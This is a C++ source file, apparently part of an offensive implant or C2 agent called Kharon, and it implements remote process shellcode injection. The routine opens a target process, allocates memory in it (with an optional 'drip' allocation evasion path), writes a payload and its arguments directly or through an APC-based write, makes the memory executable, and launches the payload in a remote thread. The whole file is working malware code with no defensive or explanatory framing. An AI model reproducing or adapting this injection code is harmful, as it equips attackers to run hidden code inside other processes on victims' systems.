#include <Kharon.h>

BOOL DECLFN Injection::Standard(
    _In_    BYTE*    Buffer,
    _In_    SIZE_T   Size,
    _In_    BYTE*    ArgBuff,
    _In_    SIZE_T   ArgSize,
    _In_    CHAR*    TaskUUID,
    _Inout_ INJ_OBJ* Object
) {
    CHAR* DefUUID = TaskUUID;

    PVOID  BaseAddress = nullptr;
    PVOID  TempAddress = nullptr;
    PVOID  Destiny     = nullptr;
    PVOID  Source      = nullptr;
    ULONG  OldProt     = 0;
    PVOID  Parameter   = nullptr;
    HANDLE ThreadHandle= INVALID_HANDLE_VALUE;
    ULONG  ThreadId    = 0;
    SIZE_T FullSize    = ArgSize + Size;
    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    HANDLE PsHandle    = INVALID_HANDLE_VALUE;

    if ( ! Object->PsHandle ) {
        PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
        if ( PsHandle == INVALID_HANDLE_VALUE ) {
            return FALSE;
        }
    } else {
        PsHandle = Object->PsHandle;
    }

    TempAddress = Self->Mm->Alloc( nullptr, FullSize, MEM_COMMIT, PAGE_READWRITE );
    if ( ! TempAddress ) {
        if ( PsHandle && ! Object->PsHandle ) Self->Ntdll.NtClose( PsHandle );
        return FALSE;
    }

    auto MemAlloc = [&]( SIZE_T AllocSize ) -> PVOID {
        PVOID addr = nullptr;
        if ( Self->Inj->Ctx.Alloc == 0 ) {
            addr = Self->Mm->Alloc( nullptr, AllocSize, MEM_COMMIT, PAGE_READWRITE, PsHandle );
        } else {
            addr = Self->Mm->DripAlloc( AllocSize, PAGE_READWRITE, PsHandle );
        }
        return addr;
    };

    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
        BOOL result = FALSE;
        if ( PsHandle == NtCurrentProcess() ) {
             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
             return result;
        } else if (Self->Inj->Ctx.Write == 0) {
            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
        } else {
            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
        }
        return result;
    };

    auto Cleanup = [&]( BOOL BooleanRet = FALSE, SIZE_T MemSizeToZero = 0 ) -> BOOL {
        SIZE_T DefaultSize = FullSize;

        if ( ! MemSizeToZero ) MemSizeToZero = DefaultSize;

        if ( BooleanRet && Object->Persist ) {
            Object->BaseAddress  = BaseAddress;
            Object->ThreadHandle = ThreadHandle;
            Object->ThreadId     = ThreadId;
        } else {
            if ( BaseAddress ) {
                Self->Mm->Free( BaseAddress, MemSizeToZero, MEM_RELEASE, PsHandle );
            }
            if ( PsHandle && ! Object->PsHandle ) {
                Self->Ntdll.NtClose( PsHandle );
            }
        }
        if ( TempAddress ) {
            Self->Mm->Free( TempAddress, FullSize, MEM_RELEASE );
        }
        
        return BooleanRet;
    };

    BaseAddress = MemAlloc( FullSize );
    if ( ! BaseAddress ) {
        BaseAddress = MemAlloc( FullSize );
        if ( ! BaseAddress ) {
            return Cleanup();
        }
    }
    
    Mem::Copy( (BYTE*)TempAddress, Buffer, Size );
    if ( ArgSize > 0 ) {
        Mem::Copy( (BYTE*)TempAddress + Size, ArgBuff, ArgSize );
        Parameter = (BYTE*)BaseAddress + Size;
    }
    
    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
        return Cleanup();
    }

    if ( ! Self->Mm->Protect( BaseAddress, FullSize, PAGE_EXECUTE_READ, &OldProt, PsHandle ) ) {
        return Cleanup();
    }

    ThreadHandle = Self->Td->Create( PsHandle, (BYTE*)BaseAddress, Parameter, 0, 0, &ThreadId );
    if ( ThreadHandle == INVALID_HANDLE_VALUE ) {
        return Cleanup();
    }

    return Cleanup( TRUE );
}

